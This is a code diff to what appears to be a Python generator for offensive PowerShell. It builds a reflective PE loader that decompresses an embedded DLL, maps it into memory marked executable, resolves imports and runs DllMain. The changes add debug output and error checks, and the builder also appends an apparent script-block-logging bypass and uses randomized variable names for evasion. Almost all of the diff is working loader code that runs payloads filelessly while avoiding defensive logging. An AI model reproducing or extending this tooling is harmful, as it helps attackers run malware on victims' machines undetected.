@@ -348,8 +348,11 @@ try{{${v['pipe']}.Close()}}catch{{}}
 
 # ─── Reflective PE loader ───
 
-def _pe_loader(v: dict, dll_b64_gz: str) -> str:
+def _pe_loader(v: dict, dll_b64_gz: str, debug: bool = False) -> str:
     """Generate PowerShell reflective PE loader — embeds and runs a DLL in-memory."""
+    # Debug helper — Write-Host always prints regardless of ErrorActionPreference
+    _d = 'Write-Host' if debug else '#'
+
     return f"""\
 # ── Reflective Loader ──
 ${v['lcs']}=@'
@@ -362,11 +365,14 @@ public class {v['lt']}{{
 }}
 public delegate bool {v['ld']}(IntPtr h,uint r,IntPtr p);
 '@
-${v['ltp']}=Add-Type -TypeDefinition ${v['lcs']} -PassThru
+try{{${v['ltp']}=Add-Type -TypeDefinition ${v['lcs']} -PassThru -ErrorAction Stop}}catch{{Write-Host "FATAL: Add-Type failed: $_";return}}
+if(-not ${v['ltp']}){{Write-Host "FATAL: Add-Type returned null";return}}
+{_d} "[DBG] Add-Type OK"
 ${v['lm']}=[Runtime.InteropServices.Marshal]
 ${v['lb6']}=@'
 {dll_b64_gz}
 '@
+try{{
 ${v['lgz']}=[Convert]::FromBase64String(${v['lb6']})
 ${v['lms']}=[IO.MemoryStream]::new(${v['lgz']})
 ${v['lgs']}=[IO.Compression.GZipStream]::new(${v['lms']},[IO.Compression.CompressionMode]::Decompress)
@@ -374,6 +380,13 @@ ${v['los']}=[IO.MemoryStream]::new()
 ${v['lgs']}.CopyTo(${v['los']})
 ${v['ldl']}=${v['los']}.ToArray()
 ${v['lgs']}.Close();${v['lms']}.Close();${v['los']}.Close()
+}}catch{{Write-Host "FATAL: Decompress failed: $_";return}}
+{_d} "[DBG] DLL bytes: $(${v['ldl']}.Length)"
+# Arch check — x64 DLL needs x64 PowerShell
+if([IntPtr]::Size -eq 4){{
+${v['lmg']}=[BitConverter]::ToUInt16(${v['ldl']},([BitConverter]::ToInt32(${v['ldl']},0x3C))+24)
+if(${v['lmg']}-eq 0x20b){{Write-Host "FATAL: x64 DLL loaded in 32-bit PowerShell";return}}
+}}
 
 # Parse PE
 ${v['lef']}=[BitConverter]::ToInt32(${v['ldl']},0x3C)
@@ -401,13 +414,16 @@ ${v['lis']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+108)
 ${v['lrr']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+136)
 ${v['lrs']}=[BitConverter]::ToUInt32(${v['ldl']},${v['lop']}+140)
 }}
+{_d} "[DBG] PE: magic=0x$(${v['lmg']}.ToString('X4')) entry=0x$(${v['ler']}.ToString('X')) imgBase=0x$(${v['lib']}.ToString('X')) size=0x$(${v['lsi']}.ToString('X'))"
 
 # Allocate — try preferred base, fall back to any
-${v['lnb']}=${v['ltp']}[0]::VirtualAlloc([IntPtr]${v['lib']},[UIntPtr]${v['lsi']},0x3000,0x40)
+${v['lnb']}=${v['ltp']}[0]::VirtualAlloc([IntPtr]${v['lib']},[UIntPtr][uint64]${v['lsi']},0x3000,0x40)
 if(${v['lnb']}-eq [IntPtr]::Zero){{
-${v['lnb']}=${v['ltp']}[0]::VirtualAlloc([IntPtr]::Zero,[UIntPtr]${v['lsi']},0x3000,0x40)
+{_d} "[DBG] Preferred base failed, trying any"
+${v['lnb']}=${v['ltp']}[0]::VirtualAlloc([IntPtr]::Zero,[UIntPtr][uint64]${v['lsi']},0x3000,0x40)
 }}
-if(${v['lnb']}-eq [IntPtr]::Zero){{return}}
+if(${v['lnb']}-eq [IntPtr]::Zero){{Write-Host "FATAL: VirtualAlloc failed — size=$(${v['lsi']})";return}}
+{_d} "[DBG] Allocated at 0x$(${v['lnb']}.ToString('X'))"
 
 # Copy headers
 ${v['lm']}::Copy(${v['ldl']},0,${v['lnb']},[int]${v['lsh']})
@@ -424,10 +440,12 @@ ${v['lm']}::Copy(${v['ldl']},[int]${v['lrp']},${v['lds']},[int]${v['lrd']})
 }}
 ${v['lsc']}+=40
 }}
+{_d} "[DBG] $(${v['lns']}) sections copied"
 
 # Process relocations
 ${v['ldt']}=${v['lnb']}.ToInt64()-${v['lib']}
 if(${v['ldt']}-ne 0 -and ${v['lrr']}-gt 0 -and ${v['lrs']}-gt 0){{
+{_d} "[DBG] Relocations: delta=0x$(${v['ldt']}.ToString('X'))"
 ${v['lpo']}=[IntPtr]::Add(${v['lnb']},[int]${v['lrr']})
 ${v['len']}=${v['lpo']}.ToInt64()+${v['lrs']}
 while(${v['lpo']}.ToInt64()-lt ${v['len']}){{
@@ -452,6 +470,7 @@ ${v['lm']}::WriteInt32(${v['lad']},[int](${v['lv']}+${v['ldt']}))
 ${v['lpo']}=[IntPtr]::Add(${v['lpo']},[int]${v['lbz']})
 }}
 }}
+{_d} "[DBG] Relocations done"
 
 # Resolve imports
 if(${v['lir']}-gt 0 -and ${v['lis']}-gt 0){{
@@ -463,6 +482,7 @@ ${v['lia']}=${v['lm']}::ReadInt32([IntPtr]::Add(${v['lid']},16))
 if(${v['lin']}-eq 0){{break}}
 if(${v['lit']}-eq 0){{${v['lit']}=${v['lia']}}}
 ${v['lmh']}=${v['ltp']}[0]::LoadLibrary(${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int]${v['lin']})))
+if(${v['lmh']}-eq [IntPtr]::Zero){{Write-Host "FATAL: LoadLibrary failed for $(${v['lm']}::PtrToStringAnsi([IntPtr]::Add(${v['lnb']},[int]${v['lin']})))";return}}
 ${v['lpt']}=[IntPtr]::Add(${v['lnb']},[int]${v['lit']})
 ${v['lad']}=[IntPtr]::Add(${v['lnb']},[int]${v['lia']})
 while($true){{
@@ -495,11 +515,16 @@ ${v['lad']}=[IntPtr]::Add(${v['lad']},4)
 ${v['lid']}=[IntPtr]::Add(${v['lid']},20)
 }}
 }}
+{_d} "[DBG] Imports resolved"
 
-# Execute entry point (DllMainCRTStartup → DllMain)
+# Execute entry point (DllMainCRTStartup -> DllMain)
 ${v['lep']}=[IntPtr]::Add(${v['lnb']},[int]${v['ler']})
+{_d} "[DBG] Calling entry at 0x$(${v['lep']}.ToString('X'))"
+try{{
 ${v['ldm']}=${v['lm']}::GetDelegateForFunctionPointer(${v['lep']},${v['ltp']}[1])
 ${v['ldm']}.Invoke(${v['lnb']},[uint32]1,[IntPtr]::Zero)
+}}catch{{Write-Host "FATAL: DllMain exception: $_";return}}
+{_d} "[DBG] DllMain returned OK, keeping process alive"
 while($true){{Start-Sleep 86400}}
 """
 
@@ -679,7 +704,7 @@ def build_powershell_loader(
     if not no_sbl:
         parts.append(_sbl_bypass(v))
 
-    parts.append(_pe_loader(v, b64_lines))
+    parts.append(_pe_loader(v, b64_lines, debug=debug))
 
     script = '\n'.join(parts)
 
